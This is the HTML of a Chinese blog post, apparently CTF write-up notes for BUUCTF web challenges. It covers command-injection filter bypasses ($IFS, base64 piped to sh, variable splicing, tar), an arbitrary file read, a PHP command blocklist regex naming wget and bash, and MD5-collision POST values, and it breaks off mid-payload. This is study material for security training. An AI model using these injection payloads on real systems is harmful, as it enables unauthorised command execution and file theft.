<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF刷题笔记（四） | A2u13's Blog</title><meta name="description" content="题目列表：  [极客大挑战 2019]BuyFlag [GXYCTF2019]Ping Ping Ping [安洵杯 2019]easy_web [极客大挑战 2019]BabySQL [SWPU2019]Web1 [ASIS 2019]Unicorn shop [CISCN2019 华北赛区 Day1 Web2]ikun [WesternCTF2018]shrine    [极客大挑战 201"><meta name="keywords" content="BUUCTF"><meta name="author" content="A2u13"><meta name="copyright" content="A2u13"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="http://ta.qq.com"/><link rel="dns-prefetch" href="http://ta.qq.com"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="BUUCTF刷题笔记（四）"><meta name="twitter:description" content="题目列表：  [极客大挑战 2019]BuyFlag [GXYCTF2019]Ping Ping Ping [安洵杯 2019]easy_web [极客大挑战 2019]BabySQL [SWPU2019]Web1 [ASIS 2019]Unicorn shop [CISCN2019 华北赛区 Day1 Web2]ikun [WesternCTF2018]shrine    [极客大挑战 201"><meta name="twitter:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="og:type" content="article"><meta property="og:title" content="BUUCTF刷题笔记（四）"><meta property="og:url" content="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><meta property="og:site_name" content="A2u13's Blog"><meta property="og:description" content="题目列表：  [极客大挑战 2019]BuyFlag [GXYCTF2019]Ping Ping Ping [安洵杯 2019]easy_web [极客大挑战 2019]BabySQL [SWPU2019]Web1 [ASIS 2019]Unicorn shop [CISCN2019 华北赛区 Day1 Web2]ikun [WesternCTF2018]shrine    [极客大挑战 201"><meta property="og:image" content="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png"><meta property="article:published_time" content="2020-02-15T08:35:55.000Z"><meta property="article:modified_time" content="2020-06-07T06:28:28.917Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="https://a2u13.com/2020/02/15/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"><link rel="prev" title="BUUCTF刷题笔记（五）" href="https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"><link rel="next" title="BUUCTF刷题笔记（三）" href="https://a2u13.com/2020/02/13/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"><script src="https://tajs.qq.com/stats?sId=&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=66562096&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://a2u13.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: false,
  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  baiduPush: false,
  highlightCopy: true,
  highlightLang: false,
  highlightShrink: 'false',
  isFontAwesomeV5: false,
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isSidebar: true  
  }</script><noscript><style>
#page-header {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="A2u13's Blog" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/4A56A073590349364F32B58397E8B06C.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">33</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">22</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-BuyFlag"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">2.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#我的解法"><span class="toc-number">2.1.</span> <span class="toc-text">我的解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大佬们的做法"><span class="toc-number">2.2.</span> <span class="toc-text">大佬们的做法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#内联执行"><span class="toc-number">2.2.1.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sh-base64"><span class="toc-number">2.2.2.</span> <span class="toc-text">sh+base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量拼接"><span class="toc-number">2.2.3.</span> <span class="toc-text">变量拼接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安洵杯-2019-easy-web"><span class="toc-number">3.</span> <span class="toc-text">[安洵杯 2019]easy_web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sort"><span class="toc-number">3.1.</span> <span class="toc-text">sort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤不严"><span class="toc-number">3.2.</span> <span class="toc-text">\过滤不严</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tar压缩绕过"><span class="toc-number">3.3.</span> <span class="toc-text">tar压缩绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#极客大挑战-2019-BabySQL"><span class="toc-number">4.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PROCEDURE-ANALYSE注入"><span class="toc-number">4.1.</span> <span class="toc-text">PROCEDURE ANALYSE注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正常报错注入"><span class="toc-number">4.2.</span> <span class="toc-text">正常报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆库名"><span class="toc-number">4.2.1.</span> <span class="toc-text">爆库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆表名"><span class="toc-number">4.2.2.</span> <span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆字段名"><span class="toc-number">4.2.3.</span> <span class="toc-text">爆字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆flag"><span class="toc-number">4.2.4.</span> <span class="toc-text">爆flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">5.</span> <span class="toc-text">[SWPU2019]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">6.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web2-ikun"><span class="toc-number">7.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WesternCTF2018-shrine"><span class="toc-number">8.</span> <span class="toc-text">[WesternCTF2018]shrine</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><div class="post-bg" id="nav" style="background-image: url(https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200529222023.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">A2u13's Blog</a></span><span class="pull_right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">BUUCTF刷题笔记（四）</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-02-15 16:35:55"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-15</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-06-07 14:28:28"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-06-07</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="post-meta__icon fa fa-file-word-o" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">3.5k</span><span class="post-meta__separator">|</span><i class="post-meta__icon fa fa-clock-o" aria-hidden="true"></i><span>阅读时长: 15 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p>
<p><strong>题目列表：</strong></p>
<ul>
<li>[极客大挑战 2019]BuyFlag</li>
<li>[GXYCTF2019]Ping Ping Ping</li>
<li>[安洵杯 2019]easy_web</li>
<li>[极客大挑战 2019]BabySQL</li>
<li>[SWPU2019]Web1</li>
<li>[ASIS 2019]Unicorn shop</li>
<li>[CISCN2019 华北赛区 Day1 Web2]ikun</li>
<li>[WesternCTF2018]shrine</li>
</ul>
<a id="more"></a>

<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215164317.png" alt=""></p>
<p>打开界面看到<code>PAYFLAG</code>解密</p>
<p>看源代码</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215164350.png" alt=""></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165238.png" alt=""></p>
<p>提示我们不是<code>Cuit&#39;s Student</code>，看到<code>Cookies</code>修改为1即可</p>
<p>接下来<code>is_numberic</code>的限制很好绕过，直接<code>404a</code>即可绕过</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165451.png" alt=""></p>
<p><code>money</code>这里输入<code>100000000</code>会提示长度过长，输入少个0会提示钱太少</p>
<p>这里响应包看到<code>PHP/5.3.3</code>,推测后台是通过<code>strcmp</code>来进行比较，直接数组绕过即可~</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215165749.png" alt=""></p>
<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>这道题是<code>Ping</code>的题</p>
<p>但是这破题过滤了<code>&gt;、flag、空格、{、}、(、)、？、*、、、/</code>一堆东西</p>
<h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>坑了一小时，翻了翻<code>Linux</code>命令，找到了<code>tar</code>压缩命令</p>
<p>这里空格可以通过<code>$IFS</code>绕过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$9</span></span></span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="meta">%</span><span class="bash">20</span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=;tar$IFS-zcvf$IFS.tar.gz$IFS.</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182157.png" alt=""></p>
<p>然后当前目录下会生成一个叫<code>.tar.gz</code>的压缩包</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182236.png" alt=""></p>
<p>注意这里<code>ls</code>需要加<code>-a</code>参数才能看到隐藏文件</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215182327.png" alt=""></p>
<p>下载下来即可读到<code>flag</code></p>
<h2 id="大佬们的做法"><a href="#大佬们的做法" class="headerlink" title="大佬们的做法"></a>大佬们的做法</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php        反斜线绕过</span><br><span class="line">cat y1”ng.php        两个单引号绕过</span><br><span class="line">echo “Y2F0IHkxbmcucGhw” | base64 -d | bash       base64编码绕过(引号可以去掉)</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bash       hex编码绕过(引号可以去掉)</span><br><span class="line">cat y1[n]g.php       用[]匹配</span><br><span class="line">cat y1n*       用*匹配任意</span><br><span class="line">内联执行</span><br><span class="line">bash 被过滤可以用 sh 代替</span><br><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line">tailf 类似于tail -f</span><br></pre></td></tr></table></figure>

<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215183616.png" alt=""></p>
<h3 id="sh-base64"><a href="#sh-base64" class="headerlink" title="sh+base64"></a>sh+base64</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>

<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215183805.png" alt=""></p>
<h3 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>

<p>这个我一开始试过，但是用的<code>$IFS</code>而不是<code>$IFS$9</code>，导致没读到<code>flag.php</code>，浪费了大半天时间，真是遗憾</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215184346.png" alt=""></p>
<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p><a href="http://da2a5d41-03de-4883-b85d-3fc61cd6d0cf.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=" target="_blank" rel="noopener">http://da2a5d41-03de-4883-b85d-3fc61cd6d0cf.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204355.png" alt=""></p>
<p>看到<code>img</code>参数先解码</p>
<p>经过两次<code>base64</code>解码以及十六进制转字符串</p>
<p>得到<code>555.jpg</code></p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204906.png" alt=""></p>
<p>推测应该存在任意文件读取漏洞</p>
<p>这里构造<code>index.php</code>转十六进制然后两次<code>base64</code>编码</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215204816.png" alt=""></p>
<p>然后把编码结果传到<code>img</code>参数</p>
<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200215205013.png" alt=""></p>
<p>解码得到<code>index.php</code>的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>前半部分图片读取那部分是幌子，真正起作用部分是下面这部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>POST</code>的<code>md5</code>比较这一块是<code>MD5碰撞</code>，这里直接给出值</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span 